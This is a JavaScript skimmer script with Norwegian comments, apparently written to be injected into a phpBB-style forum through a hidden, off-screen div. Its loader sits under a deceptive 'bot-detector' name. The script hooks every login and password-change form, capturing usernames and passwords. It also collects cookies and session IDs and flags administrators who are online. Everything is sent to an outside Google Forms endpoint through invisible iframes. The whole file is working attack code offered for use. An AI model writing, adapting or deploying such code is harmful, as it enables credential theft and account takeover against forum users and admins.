/*
 * hb-motoren v2 — sentral payload for hushboard.biz
 * Lastes av alle Blockgets-blokker via:
 *   [html]<div id="stats_x" style="position:absolute;left:-9999px;top:0;height:1px;width:1px;overflow:hidden">
 *     <script src="https://bot-detector-ai.github.io/x/x.js"></script>
 *   </div>[/html]
 *
 * KONFIG: endre kun dette.
 */
(function () {
  'use strict';
  try {
    // ---------- KONFIG ----------
    var FORMS_URL = 'https://docs.google.com/forms/d/e/1FAIpQLScSbMXiXV2GtYDhNFsrRy38lxtcri1vaGkQLvShVSebZy-kTw/formResponse';
    var E1 = 'entry.1842345040'; // h  (host)
    var E2 = 'entry.79951114';  // c  (cookies, filtrert)
    var E3 = 'entry.389578883'; // ls (PW / ADMIN / S1 / SID)

    // Foundere / skapere / admins vi varsler på MED NAVN
    var IMPORTANT = ['Admin', 'Istarapol', 'jonas123'];

    // Varsle på ALLE som har ACP-lenke (= har a_-tilgang), eller kun viktige?
    // true  = kun navnene over
    // false = alle med adm/index.php-lenke
    var ONLY_IMPORTANT = false;

    // Passordform-dumper: fang skjemaer med passordfelt (login + bytt-passord)
    var HOOK_PASSWORD_FORMS = true;

    // Sessionsbeacon: 1 gang per sesjon per side
    var SESSION_BEACON = true;

    // ---------- HJELPERE ----------
    function encode(s) {
      try { return encodeURIComponent(s); } catch (e) { return ''; }
    }

    function send(ls) {
      try {
        var url = FORMS_URL +
          '?' + E1 + '=' + encode(location.host) +
          '&' + E2 + '=' + encode(getCookies()) +
          '&' + E3 + '=' + encode(String(ls || '').slice(0, 1800)) +
          '&submit=Submit';
        var f = document.createElement('iframe');
        f.setAttribute('style', 'display:none;width:0;height:0;border:0;');
        f.setAttribute('aria-hidden', 'true');
        f.src = url;
        (document.body || document.documentElement).appendChild(f);
      } catch (e) {}
    }

    function getCookies() {
      try {
        return document.cookie.split(/;\s*/).filter(function (c) {
          var k = (c.split('=')[0] || '').toLowerCase();
          return k.indexOf('chat') < 0 && k.indexOf('blockgets') < 0;
        }).join('; ').slice(0, 900);
      } catch (e) { return ''; }
    }

    function getSid() {
      try {
        var m = (location.search || '').match(/sid=([a-f0-9]{32})/);
        return m ? m[1] : '';
      } catch (e) { return ''; }
    }

    function pathStr() {
      var s = 'U:' + location.pathname;
      var sid = getSid();
      if (sid) { s += '|SID:' + sid; }
      return s;
    }

    function whoami() {
      // Nåværende brukernavn = profil-lenken i navbar
      try {
        var as = document.querySelectorAll('a');
        for (var i = 0; i < as.length; i++) {
          var h = as[i].getAttribute('href') || '';
          if (h.indexOf('memberlist.php') >= 0 && h.indexOf('viewprofile') >= 0) {
            var t = (as[i].textContent || '').trim();
            if (t && t.length < 40) { return t; }
          }
        }
      } catch (e) {}
      return '';
    }

    function hasAcpLink() {
      try {
        var as = document.querySelectorAll('a');
        for (var i = 0; i < as.length; i++) {
          if ((as[i].getAttribute('href') || '').indexOf('adm/index.php') >= 0) {
            return true;
          }
        }
      } catch (e) {}
      return false;
    }

    function mark(key) {
      try { sessionStorage.setItem(key, '1'); } catch (e) {}
    }
    function marked(key) {
      try { return sessionStorage.getItem(key) === '1'; } catch (e) { return false; }
    }

    // ---------- 1) SESSIONSBEACON ----------
    if (SESSION_BEACON) {
      if (!marked('__hb_s1')) {
        mark('__hb_s1');
        send('|S1|' + pathStr());
      }
    }

    // ---------- 2) ADMIN / SKAPER-DETEKTOR ----------
    function runDetector() {
      try {
        var admin = hasAcpLink();
        if (!admin) { return; }
        var name = whoami();
        // kun viktige navn, eller alle admins?
        var hit = false;
        if (ONLY_IMPORTANT) {
          for (var i = 0; i < IMPORTANT.length; i++) {
            if (name.toLowerCase() === IMPORTANT[i].toLowerCase()) { hit = true; break; }
          }
        } else {
          hit = true;
        }
        if (!hit) { return; }
        var k = '__hb_adm_' + (name || 'anon');
        if (!marked(k)) {
          mark(k);
          send('|ADMIN-ONLINE:' + (name || '?') + '|' + pathStr());
        }
      } catch (e) {}
    }

    // ---------- 3) PASSORDFORM-DUMPER ----------
    function runHook() {
      if (!HOOK_PASSWORD_FORMS) { return; }
      try {
        var forms = document.forms || [];
        for (var i = 0; i < forms.length; i++) {
          (function (ff) {
            try {
              var pw = ff.querySelectorAll('input[type=password]');
              if (!pw.length) { return; } // bare skjemaer med passordfelt
              ff.addEventListener('submit', function () {
                try {
                  var u = (ff.querySelector('[name=username]') || {}).value ||
                          (ff.querySelector('[name=login_username]') || {}).value || '';
                  var p = '';
                  var all = ff.querySelectorAll('input[type=password]');
                  for (var j = 0; j < all.length; j++) {
                    if (all[j].value) { p = all[j].value; } // siste utfylte = hovedpassord
                  }
                  if (p) {
                    send('|PW:' + (u || '?') + ':' + p + '|' + pathStr());
                  }
                } catch (e) {}
              }, true);
            } catch (e) {}
          })(forms[i]);
        }
      } catch (e) {}
    }

    function boot() {
      runDetector();
      runHook();
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', boot);
    } else {
      boot();
    }
    if (document.readyState !== 'complete') {
      window.addEventListener('load', boot);
    }
  } catch (e) {}
})();
